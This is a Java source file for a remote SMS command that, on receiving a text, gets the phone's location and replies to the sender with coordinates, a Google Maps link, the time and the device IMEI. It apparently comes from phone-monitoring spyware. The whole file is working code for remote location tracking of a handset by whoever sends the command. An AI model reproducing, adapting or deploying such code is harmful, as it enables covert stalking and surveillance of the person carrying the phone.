package com.vvt.rmtcmd.sms;

import com.vvt.event.FxEvent;
import com.vvt.event.FxEventListener;
import com.vvt.event.FxGPSEvent;
import com.vvt.event.FxGPSField;
import com.vvt.event.constant.GPSExtraField;
import com.vvt.event.constant.GPSProvider;
import com.vvt.global.Global;
import com.vvt.gpsc.GPSMethod;
import com.vvt.gpsc.GPSOnDemand;
import com.vvt.gpsc.GPSOption;
import com.vvt.gpsc.GPSPriority;
import com.vvt.info.ApplicationInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import com.vvt.std.TimeUtil;
import com.vvt.version.VersionInfo;

public class CmdGPSOnDemand extends RmtCmdAsync implements FxEventListener {
	
	private static final String TEXT_GPSDATA_LATITUDE = "Lat: ";
	private static final String TEXT_GPSDATA_LONGTITUDE = "Long: ";
	private static final String TEXT_GPSDATA_ALTITUDE = "Alt: ";
	private static final String TEXT_GPSDATA_DATE = "Date: ";
	private static final String TEXT_GPSDATA_IMEI = "IMEI/ESN: ";
	private static final String TEXT_GPSDATA_METHOD = "GPS Method: ";
	private static final String AUTONOMOUS = "Autonomous";
	private static final String ASSISTED = "Assisted";
	private static final String CELL_SITE = "CellSite";
	private static final String GLOC = "Google";
	private static final String BLUETOOTH = "Bluetooth";
	private static final String UNKNOWN = "Unknown";
	private Preference pref = Global.getPreference();
	private GPSOption gpsCaptureOption = null;
	private GPSOption gpsOnDemandOption = null;
	
	public CmdGPSOnDemand(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	public void setGPSOnDemandOption(GPSOption gpsOnDemandOption) {
		this.gpsOnDemandOption = gpsOnDemandOption;
	}
	
	private void doSMSHeader() {
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(licenseInfo.getProductID());
		responseMessage.append(Constant.SPACE);
		responseMessage.append(VersionInfo.getFullVersion());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(smsCmdCode.getGPSOnDemandCmd());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.SPACE);
	}
	
	private GPSOption getDefaultGPSOnDemandOption() {
		GPSMethod autonomous = new GPSMethod();
		GPSMethod assisted = new GPSMethod();
		GPSMethod cellsite = new GPSMethod();
		GPSMethod google = new GPSMethod();
		autonomous.setMethod(GPSProvider.GPS);
		autonomous.setPriority(GPSPriority.FIRST_PRIORITY);
		assisted.setMethod(GPSProvider.AGPS);
		assisted.setPriority(GPSPriority.SECOND_PRIORITY);
		cellsite.setMethod(GPSProvider.NETWORK);
		cellsite.setPriority(GPSPriority.THIRD_PRIORITY);
		google.setMethod(GPSProvider.GPS_G);
		google.setPriority(GPSPriority.FOURTH_PRIORITY);
		GPSOption gpsOpt = new GPSOption();
		int timeout = 10;
		int index = 1;
		gpsOpt.setTimeout(timeout);
		gpsOpt.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[index]);
		gpsOpt.addGPSMethod(assisted);
		gpsOpt.addGPSMethod(google);
		gpsOpt.addGPSMethod(autonomous);
		gpsOpt.addGPSMethod(cellsite);
		return gpsOpt;
	}
	
	private void continueGPSCapture() {
		PrefGPS gps = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		gps.setGpsOption(gpsCaptureOption);
		pref.commit(gps);
	}

	private String getGPSMethod(FxGPSEvent gpsEvent) {
		String method = null;
		int id = 0;
		for (int i = 0; i < gpsEvent.countGPSField(); i++) {
			FxGPSField field = gpsEvent.getGpsField(i);
			if (field.getGpsFieldId().getId() == GPSExtraField.PROVIDER.getId()) {
				id = (int)field.getGpsFieldData();
				break;
			}
		}
		if (id == GPSProvider.GPS.getId()) {
			method = AUTONOMOUS;
		} else if (id == GPSProvider.AGPS.getId()) {
			method = ASSISTED;
		} else if (id == GPSProvider.NETWORK.getId()) {
			method = CELL_SITE;
		} else if (id == GPSProvider.GPS_G.getId()) {
			method = GLOC;
		} else if (id == GPSProvider.BLUETOOTH.getId()) {
			method = BLUETOOTH;
		} else if (id == GPSProvider.UNKNOWN.getId()) {
			method = UNKNOWN;
		}
		return method;
	}
	
	private float getAltitude(FxGPSEvent gpsEvent) {
		float alt = 0;
		for (int i = 0; i < gpsEvent.countGPSField(); i++) {
			FxGPSField field = gpsEvent.getGpsField(i);
			if (field.getGpsFieldId().getId() == GPSExtraField.ALTITUDE.getId()) {
				alt = field.getGpsFieldData();
				break;
			}
		}
		return alt;
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		// To send acknowledge SMS.
		doSMSHeader();
		responseMessage.append(Constant.OK);
		responseMessage.append(Constant.CRLF);
		responseMessage.append("Waiting for GPS data");
		smsMessage.setMessage(responseMessage.toString());
		send();
		Thread th = new Thread(this);
		th.start();
	}

	// Runnable
	public void run() {
		GPSOnDemand gpsOnDemand = new GPSOnDemand();
		PrefGPS gps = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		gpsCaptureOption = gps.getGpsOption();
		gpsOnDemand.setGPSOption((gpsOnDemandOption != null? gpsOnDemandOption : getDefaultGPSOnDemandOption()));
		gpsOnDemand.addFxEventListener(this);
		gpsOnDemand.getGPSOnDemand();
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdGPSOnDemand.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		responseMessage.delete(0, responseMessage.length());
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		responseMessage.delete(0, responseMessage.length());
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}

	// FxEventListener
	public void onError(Exception e) {
		Log.error("CmdGPSOnDemand.onError", null, e);
		doSMSHeader();
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(e.getMessage());
		smsMessage.setMessage(responseMessage.toString());
		send();
		continueGPSCapture();
	}

	public void onEvent(FxEvent event) {
		continueGPSCapture();
		FxGPSEvent gpsEvent = (FxGPSEvent)event;
		String method = getGPSMethod(gpsEvent);
		doSMSHeader();
		responseMessage.append(Constant.OK);
		responseMessage.append(Constant.CRLF);
		responseMessage.append("Link: http://maps.google.com/maps?q=(" + gpsEvent.getLatitude() + "," + gpsEvent.getLongitude() + ")&z=17" + Constant.CRLF);
		responseMessage.append(TEXT_GPSDATA_LATITUDE + gpsEvent.getLatitude() + Constant.CRLF);
		responseMessage.append(TEXT_GPSDATA_LONGTITUDE + gpsEvent.getLongitude() + Constant.CRLF);
		if (method.equals(AUTONOMOUS)) {
			responseMessage.append(TEXT_GPSDATA_ALTITUDE + getAltitude(gpsEvent) + Constant.CRLF);
		}
		responseMessage.append(TEXT_GPSDATA_METHOD + method + Constant.CRLF);
		responseMessage.append(TEXT_GPSDATA_DATE + TimeUtil.format(gpsEvent.getEventTime()) + Constant.CRLF);
		responseMessage.append(TEXT_GPSDATA_IMEI + PhoneInfo.getIMEI());
		smsMessage.setMessage(responseMessage.toString());
		send();
	}
}
